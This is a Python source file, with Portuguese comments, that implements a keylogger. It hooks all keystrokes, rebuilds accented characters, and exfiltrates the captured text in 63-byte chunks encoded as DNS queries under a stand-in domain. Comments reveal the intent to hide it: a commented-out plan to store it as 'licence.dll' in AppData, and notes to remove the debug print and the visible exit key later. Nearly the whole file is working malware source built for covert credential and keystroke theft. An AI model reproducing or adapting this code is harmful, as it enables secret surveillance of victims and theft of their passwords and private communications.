###############################################################
# Imports
###############################################################
import os
import time
import idna
import socket
import threading
import keyboard
from dnslib import DNSRecord, RR, A

###############################################################
# Vars. Global
###############################################################
# Ofuscação no Windows (Antigamente era salvo em arquivo... mudei os planos) 
# _PATH = f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\Microsoft\\Windows NA'
# _NAME = 'licence.dll'
_DNS_ADDR = ('127.0.0.1', 9953)
_FAKE_DOMAIN = '.example.com'
_KEYS = ''
_LAST_KEY = None

###############################################################
# Classes e Funções
###############################################################
def send_data(data):
    '''
    Recebe os dados e os envia usando requisições DNS
    de 63 em 63 bytes.

    Parameters:
        data (str): Data que iremos enviar
    
    Returns:
        None    
    '''
    global _DNS_ADDR, _FAKE_DOMAIN

    # Divide os dados em partes menores para serem válidos
    # como nomes de domínio máximo de 63bytes por hostname.
    # Decidi apenas previnir caso a função seja chamada com mais chars do que deveria
    parts = [data[chunk:chunk+63] for chunk in range(0, len(data), 63)] 

    while len(parts) > 0:
        # Cria o payload com o nome de domínio fictício
        part = parts.pop(0)
        part = idna.encode(part).encode('ascii')
        request = str(part) + str(_FAKE_DOMAIN)
        
        # Cria a requisição DNS
        domain = DNSRecord.question(request)

        # Envia a requisição DNS para o servidor
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5.0)

        try:
            sock.sendto(domain.pack(), ('127.0.0.1', 9953))
        except:
            print('Erro ao enviar!')

        try:
            # Recebendo resposta falsa do DNS
            _ = sock.recvfrom(512)
        except socket.timeout:
            print('Tempo de espera expirado. Não foi recebida uma resposta do servidor DNS.')
            pass
            
        # Não sei se precisa disso...
        sock.close()

def on_key_event(e):
    global _KEYS, _LAST_KEY
    
    # Só envio quando bater o tamanho máximo de envio por DNS
    if len(_KEYS) >= 63:
        send_data(_KEYS)
        _KEYS = ''
    
    # Se eu pressionei a tecla ele pega qual foi
    if e.event_type == keyboard.KEY_DOWN:
        key = e.name
        
        # Se for uma teclas especiais
        if key == 'space':
            _KEYS += ' '

        elif key == 'backspace':
            _KEYS = _KEYS[:-1]

        elif key == 'enter':
            _KEYS += '\n'

        elif key in ['´', '`', '^', '~', 'ç']:
            _LAST_KEY = key

        elif key == 'shift':
            pass

        else:
            # Pesquisei e nenhuma biblioteca trata direito as acentos...
            # Esse "Workaround" funciona...
            if _LAST_KEY:
                if _LAST_KEY == '´' and key == 'e':
                    _KEYS += 'é'
                elif _LAST_KEY == '`' and key == 'a':
                    _KEYS += 'à'
                elif _LAST_KEY == '^' and key == 'a':
                    _KEYS += 'â'
                elif _LAST_KEY == '~' and key == 'a':
                    _KEYS += 'ã'
                elif _LAST_KEY == '´' and key == 'c':
                    _KEYS += 'ç'
                else:
                    _KEYS += _LAST_KEY + key

                _LAST_KEY = None
            else:
                _KEYS += key
    
    # Apenasas verificando, remover esse print mais tarde
    print(_KEYS)

###############################################################
# Main
###############################################################
if __name__ == "__main__":
    keyboard.hook(on_key_event)
    keyboard.wait('esc') # Mudar para nada futuramente
